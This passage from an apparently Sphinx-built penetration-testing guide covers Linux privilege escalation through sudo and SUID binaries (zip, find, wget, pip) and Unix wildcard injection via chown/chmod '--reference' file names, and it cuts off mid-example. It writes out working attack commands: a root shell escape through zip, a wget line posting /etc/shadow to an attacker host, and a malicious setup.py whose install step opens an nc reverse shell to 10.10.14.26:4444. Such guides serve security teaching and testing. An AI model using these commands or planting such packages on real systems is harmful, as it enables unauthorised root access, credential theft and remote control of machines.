<span class="n">Note</span> <span class="n">that</span> <span class="n">tcpdump</span> <span class="n">will</span> <span class="n">run</span> <span class="n">the</span> <span class="n">command</span> <span class="ow">in</span> <span class="n">parallel</span> <span class="n">to</span> <span class="n">the</span> <span class="n">capture</span><span class="p">,</span> <span class="n">using</span> <span class="n">the</span> <span class="n">lowest</span> <span class="n">priority</span> <span class="n">so</span> <span class="n">that</span> <span class="n">this</span> <span class="n">doesn</span><span class="s1">&#39;t disturb the capture process.</span>

<span class="n">And</span> <span class="ow">in</span> <span class="n">case</span> <span class="n">you</span> <span class="n">would</span> <span class="n">like</span> <span class="n">to</span> <span class="n">use</span> <span class="n">a</span> <span class="n">command</span> <span class="n">that</span> <span class="n">itself</span> <span class="n">takes</span> <span class="n">flags</span> <span class="ow">or</span> <span class="n">different</span> <span class="n">arguments</span><span class="p">,</span> <span class="n">you</span> <span class="n">can</span> <span class="n">always</span> <span class="n">write</span> <span class="n">a</span> <span class="n">shell</span> <span class="n">script</span> <span class="n">that</span> <span class="n">will</span> <span class="n">take</span> <span class="n">the</span> <span class="n">savefile</span> <span class="n">name</span> <span class="k">as</span> <span class="n">the</span> <span class="n">only</span> <span class="n">argument</span><span class="p">,</span> <span class="n">make</span> <span class="n">the</span> <span class="n">flags</span> <span class="o">&amp;</span>  <span class="n">arguments</span> <span class="n">arrangements</span> <span class="ow">and</span> <span class="n">execute</span> <span class="n">the</span> <span class="n">command</span> <span class="n">that</span> <span class="n">you</span> <span class="n">want</span><span class="o">.</span>

 <span class="o">-</span><span class="n">Z</span> <span class="n">user</span>
 <span class="o">--</span><span class="n">relinquish</span><span class="o">-</span><span class="n">privileges</span><span class="o">=</span><span class="n">user</span> <span class="n">If</span> <span class="n">tcpdump</span> <span class="ow">is</span> <span class="n">running</span> <span class="k">as</span> <span class="n">root</span><span class="p">,</span> <span class="n">after</span> <span class="n">opening</span> <span class="n">the</span> <span class="n">capture</span> <span class="n">device</span> <span class="ow">or</span> <span class="nb">input</span> <span class="n">savefile</span><span class="p">,</span> <span class="n">but</span> <span class="n">before</span> <span class="n">opening</span> <span class="nb">any</span> <span class="n">savefiles</span> <span class="k">for</span> <span class="n">output</span><span class="p">,</span> <span class="n">change</span> <span class="n">the</span> <span class="n">user</span> <span class="n">ID</span> <span class="n">to</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">the</span> <span class="n">group</span> <span class="n">ID</span> <span class="n">to</span> <span class="n">the</span> <span class="n">primary</span> <span class="n">group</span> <span class="n">of</span> <span class="n">user</span><span class="o">.</span>

 <span class="n">This</span> <span class="n">behavior</span> <span class="n">can</span> <span class="n">also</span> <span class="n">be</span> <span class="n">enabled</span> <span class="n">by</span> <span class="n">default</span> <span class="n">at</span> <span class="nb">compile</span> <span class="n">time</span><span class="o">.</span>
</pre></div>
</div>
</section>
<section id="zip">
<h4>zip<a class="headerlink" href="#zip" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">touch</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">exploit</span>
<span class="n">sudo</span> <span class="o">-</span><span class="n">u</span> <span class="n">root</span> <span class="nb">zip</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">exploit</span><span class="o">.</span><span class="n">zip</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">exploit</span> <span class="o">-</span><span class="n">T</span> <span class="o">--</span><span class="n">unzip</span><span class="o">-</span><span class="n">command</span><span class="o">=</span><span class="s2">&quot;sh -c /bin/bash&quot;</span>
</pre></div>
</div>
</section>
<section id="find">
<h4>find<a class="headerlink" href="#find" title="Link to this heading"></a></h4>
<p>If find is suid, we can use</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">touch</span> <span class="n">foo</span>
<span class="n">find</span> <span class="n">foo</span> <span class="o">-</span><span class="n">exec</span> <span class="n">whoami</span> \<span class="p">;</span>
</pre></div>
</div>
<p>Here, the foo file (a blank file) is created using the touch command as the -exec parameter of the find command will execute the given command for every file that it finds, so by using “find foo” it is ensured they only execute once. The above command will be executed as root.</p>
<p>HollyGrace has mentioned this in <a class="reference external" href="https://www.gracefulsecurity.com/linux-privesc-abusing-suid/">Linux PrivEsc: Abusing SUID</a> More can be learn <a class="reference external" href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/">How-I-got-root-with-sudo</a>.</p>
</section>
<section id="wget">
<h4>wget<a class="headerlink" href="#wget" title="Link to this heading"></a></h4>
<p>If the user has permission to run wget as sudo, we can read files (if the user whom we are sudo-ing have the permisson to read) by using –post-file parameter</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>post_file = file   -- Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘--post-file=file’.
</pre></div>
</div>
<p>Example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="o">-</span><span class="n">u</span> <span class="n">root</span> <span class="n">wget</span> <span class="o">--</span><span class="n">post</span><span class="o">-</span><span class="n">file</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">AttackerIP</span><span class="p">:</span><span class="n">Port</span>
</pre></div>
</div>
<p>On the attacker side, there can be a nc listener. The above would send the contents of /etc/shadow to the listener in the post request.</p>
</section>
<section id="package-installation">
<h4>Package Installation<a class="headerlink" href="#package-installation" title="Link to this heading"></a></h4>
<p><strong>pip</strong></p>
<p>If the user have been provided permission to install packages as a sudo for example</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">User</span> <span class="n">username</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="n">hostname</span><span class="p">:</span>
   <span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">pip</span> <span class="n">install</span> <span class="o">*</span>
</pre></div>
</div>
<p>We can exploit this by creating a custom pip package which would provide us a shell.</p>
<p>First, create a folder (Let’s name it helloworld), and create two files setup.py and helloworld.py</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>username@hostname:/tmp/helloworld$ ls
helloworld.py setup.py
</pre></div>
</div>
<p>Let’s see, what setup.py contains</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="n">setup</span><span class="o">.</span><span class="n">py</span>

<span class="kn">from</span> <span class="nn">setuptools</span> <span class="kn">import</span> <span class="n">setup</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="nb">print</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.26 4444 &gt;/tmp/f&quot;</span><span class="p">)</span>

<span class="n">setup</span><span class="p">(</span>
    <span class="n">name</span><span class="o">=</span><span class="s1">&#39;helloworld-script&#39;</span><span class="p">,</span>    <span class="c1"># This is the name of your PyPI-package.</span>
    <span class="n">version</span><span class="o">=</span><span class="s1">&#39;0.1&#39;</span><span class="p">,</span>               <span class="c1"># Update the version number for new releases</span>
    <span class="n">scripts</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;helloworld&#39;</span><span class="p">]</span>       <span class="c1"># The name of your scipt, and also the command you&#39;ll be using for calling it</span>
<span class="p">)</span>
</pre></div>
</div>
<p>and helloworld.py</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="n">helloworld</span><span class="o">.</span><span class="n">py</span>
<span class="c1">#!/usr/bin/env python</span>
<span class="nb">print</span> <span class="s2">&quot;Hello World&quot;</span>
</pre></div>
</div>
<p>The above can be a part of a sample package of python pip. For more details refer <a class="reference external" href="https://github.com/pypa/sampleproject">A sample project that exists for PyPUG’s “Tutorial on Packaging and Distributing Projects”</a> , <a class="reference external" href="http://python-packaging.readthedocs.io/en/latest/index.html">How To Package Your Python Code</a> ,
<a class="reference external" href="https://stackoverflow.com/questions/22051360/a-simple-hello-world-setuptools-package-and-installing-it-with-pip">A simple Hello World setuptools package and installing it with pip</a>
and <a class="reference external" href="https://packaging.python.org/tutorials/distributing-packages/">Packaging and distributing projects</a></p>
<p>The above package can be installed by using</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="o">-</span><span class="n">u</span> <span class="n">root</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">pip</span> <span class="n">install</span> <span class="o">-</span><span class="n">e</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">helloworld</span>

<span class="n">Obtaining</span> <span class="n">file</span><span class="p">:</span><span class="o">///</span><span class="n">tmp</span><span class="o">/</span><span class="n">helloworld</span>
</pre></div>
</div>
<p>The above would execute setup.py and provide us the shell.</p>
<p>Refer <a class="reference external" href="https://packaging.python.org/tutorials/installing-packages/">Installing Packages</a> for different ways to install a pip package</p>
<p>Let’s see the installed application</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">pip</span> <span class="nb">list</span>
<span class="n">Flask</span><span class="o">-</span><span class="n">CouchDB</span> <span class="p">(</span><span class="mf">0.2.1</span><span class="p">)</span>
<span class="n">helloworld</span><span class="o">-</span><span class="n">script</span> <span class="p">(</span><span class="mf">0.1</span><span class="p">,</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">helloworld</span><span class="p">)</span>
<span class="n">Jinja2</span> <span class="p">(</span><span class="mf">2.10</span><span class="p">)</span>
</pre></div>
</div>
<p><strong>npm</strong></p>
<p>npm allows packages to take actions that could result in a malicious npm package author to create a worm that spreads across the majority of the npm ecosystem. Refer <a class="reference external" href="https://www.kb.cert.org/vuls/id/319816">npm fails to restrict the actions of malicious npm packages</a>
, <a class="reference external" href="https://github.com/joaojeronimo/rimrafall">npm install could be dangerous: Rimrafall</a> and <a class="reference external" href="https://blog.npmjs.org/post/141702881055/package-install-scripts-vulnerability">Package install scripts vulnerability</a></p>
</section>
</section>
<section id="unix-wildcards">
<h3>Unix Wildcards<a class="headerlink" href="#unix-wildcards" title="Link to this heading"></a></h3>
<p>The below text is directly from the <a class="reference external" href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">DefenseCode Unix WildCards Gone Wild</a>.</p>
<section id="chown-file-reference-trick-file-owner-hijacking">
<h4>Chown file reference trick (file owner hijacking)<a class="headerlink" href="#chown-file-reference-trick-file-owner-hijacking" title="Link to this heading"></a></h4>
<p>First really interesting target I’ve stumbled across is ‘chown’. Let’s say that we have some publicly writeable directory with bunch of PHP files in there, and root user wants to change owner of all PHP files to ‘nobody’. Pay attention to the file owners in the following files list.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">52</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">22</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">34</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">66</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">80</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">config</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">40</span> <span class="o">.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">45</span> <span class="o">--</span><span class="n">reference</span><span class="o">=.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">----.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">66</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">password</span><span class="o">.</span><span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
<p>Files in this public directory are mostly owned by the user named ‘user’, and root user will now change that to ‘nobody’.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># chown -R nobody:nobody \*.php</span>
</pre></div>
</div>
<p>Let’s see who owns files now…</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">52</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">22</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">34</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">66</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">80</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">config</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">40</span> <span class="o">.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">45</span> <span class="o">--</span><span class="n">reference</span><span class="o">=.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">----.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">66</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">password</span><span class="o">.</span><span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
<p>Something is not right. What happened? Somebody got drunk here. Superuser tried to change files owner to the user:group ‘nobody’, but somehow, all files are owned by the user ‘leon’ now. If we take closer look, this directory previously contained just the following two files created and owned by the user ‘leon’.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">40</span> <span class="o">.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">45</span> <span class="o">--</span><span class="n">reference</span><span class="o">=.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
<p>Thing is that wildcard character used in ‘chown’ command line took arbitrary ‘–reference=.drf.php’ file and passed it to the chown command at the command line as an option.</p>
<p>Let’s check chown manual page (man chown):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">--</span><span class="n">reference</span><span class="o">=</span><span class="n">RFILE</span>     <span class="n">use</span> <span class="n">RFILE</span><span class="s1">&#39;s owner and group rather than specifying OWNER:GROUP values</span>
</pre></div>
</div>
<p>So in this case, ‘–reference’ option to ‘chown’ will override ‘nobody:nobody’ specified as the root, and new owner of files in this directory will be exactly same as the owner of ‘.drf.php’, which is in this case user ‘leon’. Just for the record, ‘.drf’ is short for Dummy Reference File. :)</p>
<p>To conclude, reference option can be abused to change ownership of files to some arbitrary user. If we set some other file as argument  to the –reference option, file that’s owned by some other user, not ‘leon’, in that case he would become owner of all files in this directory. With this simple chown parameter pollution, we can trick root into changing ownership of files to arbitrary users, and practically “hijack” files that are of interest to us.</p>
<p>Even more, if user ‘leon’ previously created a symbolic link in that directory that points to let’s say /etc/shadow, ownership of /etc/shadow would also be changed to the user ‘leon’.</p>
</section>
<section id="chmod-file-reference-trick">
<h4>Chmod file reference trick<a class="headerlink" href="#chmod-file-reference-trick" title="Link to this heading"></a></h4>
<p>Another interesting attack vector similar to previously described ‘chown’ attack is ‘chmod’. Chmod also has –reference option that can be abused to specify arbitrary permissions on files selected with asterisk wildcard. Chmod manual page (man chmod):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">--</span><span class="n">reference</span><span class="o">=</span><span class="n">RFILE</span>    <span class="p">:</span>   <span class="n">use</span> <span class="n">RFILE</span><span class="s1">&#39;s mode instead of MODE values</span>
</pre></div>
</div>
<p>Example is presented below.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">68</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">41</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">24</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">18</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">20480</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">13</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
